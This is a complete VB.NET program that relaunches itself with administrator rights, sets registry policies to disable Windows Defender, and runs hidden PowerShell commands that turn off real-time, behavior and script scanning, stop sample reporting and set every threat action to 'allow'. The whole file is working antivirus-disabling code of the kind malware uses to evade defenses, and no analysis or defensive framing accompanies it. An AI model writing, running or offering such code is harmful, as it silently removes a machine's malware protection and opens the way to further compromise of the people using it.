Imports System.Reflection

Module Module1

    Sub Main()
        If Not My.Application.CommandLineArgs.Contains("/elevate") Then
            Dim shellApp As Object = CreateObject("Shell.Application")
            shellApp.ShellExecute(Assembly.GetExecutingAssembly().Location, """" & Assembly.GetExecutingAssembly().Location & """ /elevate", "", "runas", 1)
            Return
        End If

        Dim wshShell As Object = CreateObject("WScript.Shell")
        wshShell.RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD")
        wshShell.RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", "1", "REG_DWORD")
        wshShell.RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection", "1", "REG_DWORD")
        wshShell.RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable", "1", "REG_DWORD")
        wshShell.RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRawWriteNotification", "1", "REG_DWORD")
        wshShell.RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableIOAVProtection", "1", "REG_DWORD")
        wshShell.RegWrite("HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", "1", "REG_DWORD")

        Threading.Thread.Sleep(100)

        outputMessage("Set-MpPreference -DisableRealtimeMonitoring $true")
        outputMessage("Set-MpPreference -DisableBehaviorMonitoring $true")
        outputMessage("Set-MpPreference -DisableBlockAtFirstSeen $true")
        outputMessage("Set-MpPreference -DisableIOAVProtection $true")
        outputMessage("Set-MpPreference -DisableScriptScanning $true")
        outputMessage("Set-MpPreference -SubmitSamplesConsent 2")
        outputMessage("Set-MpPreference -MAPSReporting 0")
        outputMessage("Set-MpPreference -HighThreatDefaultAction 6 -Force")
        outputMessage("Set-MpPreference -ModerateThreatDefaultAction 6")
        outputMessage("Set-MpPreference -LowThreatDefaultAction 6")
        outputMessage("Set-MpPreference -SevereThreatDefaultAction 6")
    End Sub

    Sub outputMessage(ByVal args As String)
        Dim objShell As Object = CreateObject("Wscript.shell")
        objShell.run("powershell " + args, 0)
    End Sub
End Module
